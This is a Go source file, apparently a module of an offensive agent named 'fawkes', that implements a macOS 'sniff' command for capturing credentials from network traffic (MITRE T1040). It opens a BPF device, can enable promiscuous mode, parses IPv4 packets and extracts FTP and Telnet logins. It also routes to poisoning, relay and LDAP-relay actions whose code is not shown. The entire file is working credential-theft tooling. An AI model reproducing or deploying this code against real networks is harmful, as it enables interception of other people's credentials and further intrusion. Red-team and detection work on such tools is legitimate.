//go:build darwin

package commands

import (
	"encoding/binary"
	"fmt"
	"net"
	"time"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/unix"
)

type SniffCommand struct{}

func (c *SniffCommand) Name() string { return "sniff" }
func (c *SniffCommand) Description() string {
	return "Passive network sniffing for credential capture (T1040)"
}

func (c *SniffCommand) Execute(task structs.Task) structs.CommandResult {
	params, parseErr := requireParams[sniffParams](task)
	if parseErr != nil {
		return *parseErr
	}

	if params.Action == "poison" {
		return c.executePoison(task)
	}
	if params.Action == "relay" {
		return c.executeRelay(task)
	}
	if params.Action == "ldap-relay" {
		return executeLDAPRelayCore(task)
	}

	ports := sniffApplyDefaults(&params)

	ifaceName := params.Interface
	if ifaceName == "" {
		ifaceName = "en0"
	}

	if _, err := net.InterfaceByName(ifaceName); err != nil {
		return errorf("Interface %q not found: %v", ifaceName, err)
	}

	// Open a BPF device (/dev/bpf0 through /dev/bpf15)
	fd := -1
	for i := 0; i < 16; i++ {
		dev := fmt.Sprintf("/dev/bpf%d", i)
		var openErr error
		fd, openErr = unix.Open(dev, unix.O_RDONLY, 0)
		if openErr == nil {
			break
		}
	}
	if fd < 0 {
		return errorf("Failed to open BPF device (need root): no available /dev/bpfN")
	}
	defer unix.Close(fd)

	// BIOCSETIF — bind to interface
	ifReq := [32]byte{}
	copy(ifReq[:], ifaceName)
	_, _, errno := unix.Syscall(unix.SYS_IOCTL, uintptr(fd), uintptr(0x8020426C), uintptr(unsafe.Pointer(&ifReq[0])))
	if errno != 0 {
		return errorf("BIOCSETIF failed for %q: %v", ifaceName, errno)
	}

	// BIOCIMMEDIATE — deliver packets immediately
	imm := 1
	unix.Syscall(unix.SYS_IOCTL, uintptr(fd), uintptr(0x80044270), uintptr(unsafe.Pointer(&imm)))

	result := &sniffResult{}

	// BIOCPROMISC — promiscuous mode
	if params.Promiscuous {
		_, _, errno = unix.Syscall(unix.SYS_IOCTL, uintptr(fd), uintptr(0x20004269), 0)
		if errno != 0 {
			result.Errors = append(result.Errors, fmt.Sprintf("promiscuous mode failed: %v", errno))
		}
	}

	// BIOCGBLEN — get buffer length
	bufLen := 0
	unix.Syscall(unix.SYS_IOCTL, uintptr(fd), uintptr(0x40044266), uintptr(unsafe.Pointer(&bufLen)))
	if bufLen <= 0 {
		bufLen = 4096
	}

	// BIOCSRTIMEOUT — read timeout
	tv := unix.Timeval{Sec: 1, Usec: 0}
	unix.Syscall(unix.SYS_IOCTL, uintptr(fd), uintptr(0x8010426D), uintptr(unsafe.Pointer(&tv)))

	ftpTracker := &sniffFTPTracker{pending: make(map[string]string)}
	telnetTracker := &sniffTelnetTracker{pending: make(map[string]string)}
	var pcapCollector *sniffPCAPCollector
	if params.SavePCAP {
		pcapCollector = newSniffPCAPCollector(params.MaxBytes)
	}
	deadline := time.Now().Add(time.Duration(params.Duration) * time.Second)
	startTime := time.Now()
	buf := make([]byte, bufLen)

	for !task.DidStop() && time.Now().Before(deadline) && result.BytesCaptured < params.MaxBytes {
		n, readErr := unix.Read(fd, buf)
		if readErr != nil {
			if readErr == unix.EAGAIN || readErr == unix.EWOULDBLOCK || readErr == unix.EINTR {
				continue
			}
			result.Errors = append(result.Errors, fmt.Sprintf("read: %v", readErr))
			break
		}
		if n == 0 {
			continue
		}

		// Parse BPF buffer (may contain multiple packets)
		offset := 0
		for offset < n {
			if offset+18 > n {
				break
			}
			bpfHdrLen := int(binary.LittleEndian.Uint16(buf[offset+16 : offset+18]))
			capLen := int(binary.LittleEndian.Uint32(buf[offset+8 : offset+12]))
			if bpfHdrLen == 0 || capLen == 0 {
				break
			}
			pktStart := offset + bpfHdrLen
			pktEnd := pktStart + capLen
			if pktEnd > n {
				break
			}

			packet := buf[pktStart:pktEnd]
			result.PacketCount++
			result.BytesCaptured += int64(capLen)

			if pcapCollector != nil {
				pcapCollector.addPacket(packet)
			}

			if len(packet) >= 14 && binary.BigEndian.Uint16(packet[12:14]) == 0x0800 {
				if pkt := sniffParseIPPacket(packet[14:]); pkt != nil {
					if sniffMatchPort(ports, pkt.Meta.SrcPort, pkt.Meta.DstPort) {
						sniffExtractCredentials(pkt.Payload, &pkt.Meta, result, ftpTracker, telnetTracker)
					}
				}
			}

			// BPF word-aligned next packet
			aligned := (capLen + bpfHdrLen + 3) & ^3
			offset += aligned
		}
	}

	return sniffFinalizeResult(&task, result, startTime, pcapCollector, 1)
}
